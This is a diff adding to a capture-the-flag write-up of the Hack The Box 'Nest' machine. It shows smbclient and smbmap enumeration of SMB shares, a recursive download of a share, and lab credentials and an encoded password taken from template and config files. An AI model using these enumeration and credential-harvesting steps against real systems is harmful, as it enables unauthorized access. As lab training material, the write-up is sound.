@@ -175,5 +175,191 @@ Unable to connect with SMB1 -- no workgroup available
 
 We have some user names C.Smith, L.Frost,  and R.Thompson
 
+now lets take a look at data by starting with:
+.\Data\Shared\Templates\HR\*
+.\Data\Shared\Maintenance\*
 
+### SMB Client
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ smbclient -N //10.10.10.178/data
+Try "help" to get a list of possible commands.
+smb: \> cd /Shared/Templates/HR
+smb: \Shared\Templates\HR\> ls
+  .                                   D        0  Wed Aug  7 12:08:01 2019
+  ..                                  D        0  Wed Aug  7 12:08:01 2019
+  Welcome Email.txt                   A      425  Wed Aug  7 15:55:36 2019
+
+		5242623 blocks of size 4096. 1840045 blocks available
+smb: \Shared\Templates\HR\> get "Welcome Email.txt"
+getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
+smb: \Shared\Templates\HR\> cd ..
+smb: \Shared\Templates\> cd ..
+smb: \Shared\> cd ..
+smb: \> ls
+  .                                   D        0  Wed Aug  7 15:53:46 2019
+  ..                                  D        0  Wed Aug  7 15:53:46 2019
+  IT                                  D        0  Wed Aug  7 15:58:07 2019
+  Production                          D        0  Mon Aug  5 14:53:38 2019
+  Reports                             D        0  Mon Aug  5 14:53:44 2019
+  Shared                              D        0  Wed Aug  7 12:07:51 2019
+
+		5242623 blocks of size 4096. 1840045 blocks available
+smb: \> cd /Shared/Maintenance
+smb: \Shared\Maintenance\> ls
+  .                                   D        0  Wed Aug  7 12:07:32 2019
+  ..                                  D        0  Wed Aug  7 12:07:32 2019
+  Maintenance Alerts.txt              A       48  Mon Aug  5 16:01:44 2019
+
+		5242623 blocks of size 4096. 1840045 blocks available
+smb: \Shared\Maintenance\> get "Maintenance Alerts.txt"
+getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.2 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+```
+
+Lets take a look at our files now.
+
+### Welcome Email
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ cat 'Welcome Email.txt' 
+We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>
+
+You will find your home folder in the following location: 
+\\HTB-NEST\Users\<USERNAME>
+
+If you have any issues accessing specific services or workstations, please inform the 
+IT department and use the credentials below until all systems have been set up for you.
+
+Username: TempUser
+Password: welcome2019
+
+
+Thank you
+```
+
+We haev TempUser credentials
+
+### Maintenance Alerts
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ cat 'Maintenance Alerts.txt' 
+There is currently no scheduled maintenance work
+```
+Nothing here
+
+Now lets see what I can see with TempUser
+
+### SMB Map
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ smbmap -H 10.10.10.178 -u TempUser -p welcome2019
+[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY	
+	IPC$                                              	NO ACCESS	Remote IPC
+	Secure$                                           	READ ONLY	
+	Users                                             	READ ONLY
+```
+
+I cant access anything in secure
+
+### SMB Client
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ smbclient -U TempUser //10.10.10.178/Secure$ welcome2019
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Aug  7 16:08:12 2019
+  ..                                  D        0  Wed Aug  7 16:08:12 2019
+  Finance                             D        0  Wed Aug  7 12:40:13 2019
+  HR                                  D        0  Wed Aug  7 16:08:11 2019
+  IT                                  D        0  Thu Aug  8 03:59:25 2019
+
+		5242623 blocks of size 4096. 1839915 blocks available
+smb: \> cd HR
+smb: \HR\> ls
+NT_STATUS_ACCESS_DENIED listing \HR\*
+smb: \HR\> cd .
+smb: \HR\> cd IT
+cd \HR\IT\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+smb: \HR\> cd ..
+smb: \> ls
+  .                                   D        0  Wed Aug  7 16:08:12 2019
+  ..                                  D        0  Wed Aug  7 16:08:12 2019
+  Finance                             D        0  Wed Aug  7 12:40:13 2019
+  HR                                  D        0  Wed Aug  7 16:08:11 2019
+  IT                                  D        0  Thu Aug  8 03:59:25 2019
+
+		5242623 blocks of size 4096. 1839915 blocks available
+smb: \> cd IT
+smb: \IT\> ls
+NT_STATUS_ACCESS_DENIED listing \IT\*
+smb: \IT\> CD ..
+smb: \> cd Finance
+smb: \Finance\> ls
+NT_STATUS_ACCESS_DENIED listing \Finance\*
+smb: \Finance\> 
+```
+now lets take a look at Data and I also googled a simple way to do this :)
+
+### SMB Client with mget
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ smbclient -U TempUser //10.10.10.178/Data welcome2019
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Aug  7 15:53:46 2019
+  ..                                  D        0  Wed Aug  7 15:53:46 2019
+  IT                                  D        0  Wed Aug  7 15:58:07 2019
+  Production                          D        0  Mon Aug  5 14:53:38 2019
+  Reports                             D        0  Mon Aug  5 14:53:44 2019
+  Shared                              D        0  Wed Aug  7 12:07:51 2019
+
+		5242623 blocks of size 4096. 1840043 blocks available
+smb: \> cd Shared
+smb: \Shared\> ls
+  .                                   D        0  Wed Aug  7 12:07:51 2019
+  ..                                  D        0  Wed Aug  7 12:07:51 2019
+  Maintenance                         D        0  Wed Aug  7 12:07:32 2019
+  Templates                           D        0  Wed Aug  7 12:08:07 2019
+
+		5242623 blocks of size 4096. 1840043 blocks available
+smb: \Shared\> cd ..
+smb: \> recurse on
+smb: \> prompt off
+smb: \> mget *
+getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+getting file \IT\Configs\Adobe\editing.xml of size 246 as IT/Configs/Adobe/editing.xml (0.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+getting file \IT\Configs\Adobe\Options.txt of size 0 as IT/Configs/Adobe/Options.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+getting file \IT\Configs\Adobe\projects.xml of size 258 as IT/Configs/Adobe/projects.xml (0.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+getting file \IT\Configs\Adobe\settings.xml of size 1274 as IT/Configs/Adobe/settings.xml (4.6 KiloBytes/sec) (average 1.4 KiloBytes/sec)
+getting file \IT\Configs\Atlas\Temp.XML of size 1369 as IT/Configs/Atlas/Temp.XML (5.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
+getting file \IT\Configs\Microsoft\Options.xml of size 4598 as IT/Configs/Microsoft/Options.xml (14.6 KiloBytes/sec) (average 4.1 KiloBytes/sec)
+getting file \IT\Configs\NotepadPlusPlus\config.xml of size 6451 as IT/Configs/NotepadPlusPlus/config.xml (23.4 KiloBytes/sec) (average 6.5 KiloBytes/sec)
+getting file \IT\Configs\NotepadPlusPlus\shortcuts.xml of size 2108 as IT/Configs/NotepadPlusPlus/shortcuts.xml (7.7 KiloBytes/sec) (average 6.6 KiloBytes/sec)
+getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as IT/Configs/RU Scanner/RU_config.xml (1.0 KiloBytes/sec) (average 6.1 KiloBytes/sec)
+getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt (1.5 KiloBytes/sec) (average 5.7 KiloBytes/sec)
+smb: \> 
+```
+
+### Findings
+
+IT Directory
+Atlas/temp.xml
+Possible new users: 
+Deanna Meyes
+Jolie Lenehan
+Robert O'hara
+
+Configs/notepadplusplus/config.xml
+<File filename="C:\windows\System32\drivers\etc\hosts"/><File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt"/><File filename="C:\Users\C.Smith\Desktop\todo.txt"/>
+User: Carl
+
+RU Scanner
+RU_Config.xml
+<ConfigFile><Port>389</Port><Username>c.smith</Username><Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password></ConfigFile>
+We have c.smith's password
 
